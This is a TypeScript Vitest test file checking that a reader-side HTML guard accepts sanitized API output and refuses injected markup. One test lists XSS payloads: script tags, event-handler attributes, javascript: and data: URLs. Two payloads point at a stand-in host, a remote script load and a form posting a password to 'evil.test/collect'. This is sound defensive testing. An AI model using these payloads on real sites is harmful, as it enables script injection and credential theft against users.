/**
 * The XSS case from Phase 2, at the point of injection. FastAPI sanitizes first; these tests pin
 * what the reader-side guard does if HTML with executable intent ever reaches it anyway (a bug in
 * the API, a hand-edited body, a future parser).
 */

import { describe, expect, it } from 'vitest';
import { inspectBodyHtml, safeBodyHtml } from '#lib/markdown';
import { renderedWithLink } from '../tests/fixtures';

describe('inspectBodyHtml', () => {
	it('accepts what api/app/rendering.py actually produces', () => {
		const html = [
			'<h2>Using it</h2>',
			'<p>Read the <a href="https://sheets.example.edu/roster" target="_blank" rel="noopener noreferrer nofollow">roster</a>.</p>',
			'<ul><li>one</li></ul>',
			'<pre><code>echo &quot;hi &lt;there&gt;&quot;</code></pre>',
			'<table><thead><tr><th align="left">a</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>',
			'<p>Mail <a href="mailto:help@colby.edu" target="_blank" rel="noopener noreferrer nofollow">help</a>.</p>'
		].join('');
		expect(inspectBodyHtml(html)).toEqual({ ok: true, html });
	});

	it('accepts an empty body', () => {
		expect(inspectBodyHtml('')).toEqual({ ok: true, html: '' });
		expect(safeBodyHtml(undefined)).toBe('');
	});

	it('refuses every escaped-or-live script injection we throw at it', () => {
		const payloads = [
			'<script>alert(1)</script>',
			'<p>fine</p><script src="https://evil.test/x.js"></script>',
			'<img src=x onerror=alert(1)>',
			'<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>',
			'<a href="javascript:alert(1)">click</a>',
			"<a href = 'javascript:alert(1)'>click</a>",
			'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
			'<iframe src="https://evil.test"></iframe>',
			'<div onclick="alert(1)">x</div>',
			'<style>body{display:none}</style>',
			'<form action="https://evil.test/collect"><input name=pw></form>',
			'<a href="https://ok.test" target="_top">frames are not safe</a>',
			'<a href="https://ok.test" rel="opener">leaks window.opener</a>',
			'<!-- conditional comment --><p>x</p>',
			'<?php echo "x"; ?>'
		];

		for (const payload of payloads) {
			const check = inspectBodyHtml(payload);
			expect(check.ok, payload).toBe(false);
			if (check.ok) continue;
			expect(check.reason.length, payload).toBeGreaterThan(0);
			expect(safeBodyHtml(payload)).toBeNull();
		}
	});

	it('still shows the reader the escaped text when the API escaped it (nothing live to refuse)', () => {
		// This is the normal case for a write-up that *documents* an injection attempt: the API
		// escaped it, so there is no live tag here and the fragment renders.
		const escaped = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
		expect(inspectBodyHtml(escaped)).toEqual({ ok: true, html: escaped });
	});

	it('refuses an attribute our API would never emit', () => {
		expect(inspectBodyHtml('<p title="x" class="evil">y</p>').ok).toBe(false);
	});

	it('does not rewrite HTML, it only accepts or refuses', () => {
		expect(safeBodyHtml(renderedWithLink)).toBe(renderedWithLink);
	});
});
